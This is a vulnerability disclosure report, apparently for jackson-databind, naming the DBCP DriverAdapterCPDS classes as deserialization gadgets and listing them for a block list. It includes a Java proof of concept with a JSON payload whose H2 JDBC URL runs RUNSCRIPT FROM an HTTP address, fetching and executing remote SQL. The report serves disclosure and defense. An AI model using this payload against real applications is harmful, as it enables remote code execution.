Report by: Al1ex@knownsec
(Contact author: hps_fly@163.com or https://github.com/Al1ex/)
Received: 2020-12-31
Evaluation:

  Refers to specific class (DriverAdapterCPDS) that exists in DBCP 1.x and 2.x
  and embedded by a few other libraries. Although exact exploitation may depend
  on other criteria, it seems reasonable to add blocks along with existing DBCP
  class blocks (for 2 classes)
---------------------------------------------------------------------------
pom.xml

  (dependencies already exist)
---------------------------------------------------------------------------
Blocks to add, main DBCP:

- org.apache.commons.dbcp.cpdsadapter.DriverAdapterCPDS
- org.apache.commons.dbcp2.cpdsadapter.DriverAdapterCPDS

Embedded:

- oadd.org.apache.commons.dbcp.cpdsadapter.DriverAdapterCPDS
- org.apache.tomcat.dbcp.dbcp.cpdsadapter.DriverAdapterCPDS
- org.apache.tomcat.dbcp.dbcp2.cpdsadapter.DriverAdapterCPDS

---------------------------------------------------------------------------
POC:


public class POC {
    public static void main(String[] args) throws Exception {
        String payload = "[\"org.apache.commons.dbcp2.cpdsadapter.DriverAdapterCPDS\",
{\"url\":\"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://127.0.0.1:3333/exec.sql'\"}]";
        ObjectMapper mapper = new ObjectMapper();
        mapper.enableDefaultTyping();
        mapper.configure(SerializationFeature.FAIL_ON_EMPTY_BEANS, false);
        Object obj = mapper.readValue(payload, Object.class);
        mapper.writeValueAsString(obj);
    }
}
